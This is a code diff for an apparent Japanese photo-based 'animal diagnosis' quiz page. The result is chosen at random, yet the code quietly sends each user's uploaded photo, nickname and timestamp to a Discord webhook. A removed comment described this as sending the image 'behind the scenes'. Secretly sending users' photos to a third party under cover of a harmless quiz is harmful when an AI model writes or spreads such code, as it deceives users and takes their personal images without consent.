@@ -31,11 +31,24 @@ document.addEventListener('DOMContentLoaded', createStars);
 const uploadBtn = document.getElementById("uploadBtn");
 const fileInput = document.getElementById("fileInput");
 
-uploadBtn.addEventListener("click", () => fileInput.click());
+uploadBtn.addEventListener("click", () => {
+    const nickname = document.getElementById("nicknameInput").value.trim();
+
+    if (!nickname) {
+        alert("ニックネームを入力してください");
+        return;
+    }
+
+    // 名前保存
+    localStorage.setItem("nickname", nickname);
+
+    fileInput.click();
+});
 
 fileInput.addEventListener("change", async () => {
     const file = fileInput.files[0];
     if (!file) return;
+
     if (!file.type.match('image.*')) {
         alert("画像を選択してください");
         return;
@@ -43,27 +56,28 @@ fileInput.addEventListener("change", async () => {
 
     lastUploadedFile = file;
 
-    // 診断生成（ランダム動物）
+    // 診断生成
     const animal = getRandomAnimal();
-    storeResultData(animal); // ユーザー向けに結果保存
+    storeResultData(animal);
+    
+   if (lastUploadedFile) {
+    const resizedBlob = await resizeImage(lastUploadedFile);
+    const formData = new FormData();
 
-    // Discord に裏で画像だけ送信
-   const nickname = localStorage.getItem("nickname") || "未入力";
-const now = new Date().toLocaleString("ja-JP");
+    const nickname = localStorage.getItem("nickname") || "未入力";
+    const now = new Date().toLocaleString("ja-JP");
 
-const payload = {
-    content: `📷 新しい診断\n👤 ニックネーム: ${nickname}\n🕒 時間: ${now}`
-};
+    const payload = {
+        content: `📷 新しい診断\n👤 ニックネーム: ${nickname}\n🕒 時間: ${now}`
+    };
 
-formData.append("payload_json", JSON.stringify(payload));
-formData.append("file", resizedBlob, "image.png");
+    formData.append("payload_json", JSON.stringify(payload));
+    formData.append("file", resizedBlob, "image.png");
 
-        fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData })
-            .then(res => console.log("Discord送信成功", res.status))
-            .catch(err => console.error("Discord送信失敗", err));
-    }
-
-    // 結果ページへ
+    fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData })
+        .then(res => console.log("Discord送信成功", res.status))
+        .catch(err => console.error("Discord送信失敗", err));
+}
     window.location.href = 'result.html';
 });
 
